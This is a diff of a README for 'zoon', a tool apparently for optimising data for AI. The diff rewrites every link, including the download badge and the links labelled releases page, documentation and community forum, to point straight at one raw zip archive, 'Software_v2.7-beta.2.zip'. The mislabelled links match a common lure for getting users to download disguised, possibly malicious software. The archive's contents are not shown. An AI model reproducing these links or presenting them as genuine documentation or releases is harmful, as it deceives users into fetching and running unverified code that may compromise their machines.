@@ -1,6 +1,6 @@
 # 🚀 zoon - Optimize Your Data for Better AI Performance
 
-[![Download ZOON](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip%20ZOON-v1.0.0-blue)](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip)
+[![Download ZOON](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip%20ZOON-v1.0.0-blue)](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip)
 
 ## 📋 Introduction
 
@@ -14,7 +14,7 @@ To get started with ZOON, follow these simple steps. You will need to download t
 
 To download ZOON, visit the following page:
 
-[Visit the Releases Page to Download](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip)
 
 On this page, you will see different versions of ZOON available. Choose the version that fits your operating system. Click on the download link, and the file will start downloading. 
 
@@ -68,8 +68,8 @@ We welcome your feedback and suggestions. If you encounter any issues or have id
 
 ## 📥 Quick Links
 
-- [Visit the Releases Page to Download](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip)
-- [Documentation](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip)
-- [Community Forum](https://github.com/ppejack/zoon/raw/refs/heads/main/packages/zoon-cli/Software_v1.0.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/ppejack/zoon/main/apps/Software_v2.7-beta.2.zip)
 
 By following these steps, you can successfully download, install, and use ZOON to enhance your AI applications. Enjoy exploring data like never before!
